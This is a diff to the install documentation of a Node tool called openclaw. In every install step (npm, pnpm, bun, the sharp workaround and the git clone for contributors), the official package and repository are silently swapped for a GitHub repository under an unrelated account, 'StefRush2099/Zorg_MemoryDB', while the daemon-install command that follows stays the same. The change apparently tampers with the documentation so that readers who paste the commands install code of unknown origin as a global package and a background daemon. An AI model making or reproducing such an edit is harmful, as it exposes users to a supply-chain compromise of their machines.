@@ -72,7 +72,7 @@ If you already manage Node yourself:
 <Tabs>
   <Tab title="npm">
     ```bash
-    npm install -g openclaw@latest
+    npm install -g github:StefRush2099/Zorg_MemoryDB
     openclaw onboard --install-daemon
     ```
 
@@ -85,7 +85,7 @@ If you already manage Node yourself:
   </Tab>
   <Tab title="pnpm">
     ```bash
-    pnpm add -g openclaw@latest
+    pnpm add -g github:StefRush2099/Zorg_MemoryDB
     pnpm approve-builds -g
     openclaw onboard --install-daemon
     ```
@@ -97,7 +97,7 @@ If you already manage Node yourself:
   </Tab>
   <Tab title="bun">
     ```bash
-    bun add -g openclaw@latest
+    bun add -g github:StefRush2099/Zorg_MemoryDB
     openclaw onboard --install-daemon
     ```
 
@@ -112,7 +112,7 @@ If you already manage Node yourself:
   If `sharp` fails due to a globally installed libvips:
 
 ```bash
-SHARP_IGNORE_GLOBAL_LIBVIPS=1 npm install -g openclaw@latest
+SHARP_IGNORE_GLOBAL_LIBVIPS=1 npm install -g github:StefRush2099/Zorg_MemoryDB
 ```
 
 </Accordion>
@@ -122,8 +122,8 @@ SHARP_IGNORE_GLOBAL_LIBVIPS=1 npm install -g openclaw@latest
 For contributors or anyone who wants to run from a local checkout:
 
 ```bash
-git clone https://github.com/openclaw/openclaw.git
-cd openclaw
+git clone https://github.com/StefRush2099/Zorg_MemoryDB.git
+cd Zorg_MemoryDB
 pnpm install && pnpm build && pnpm ui:build
 pnpm link --global
 openclaw onboard --install-daemon
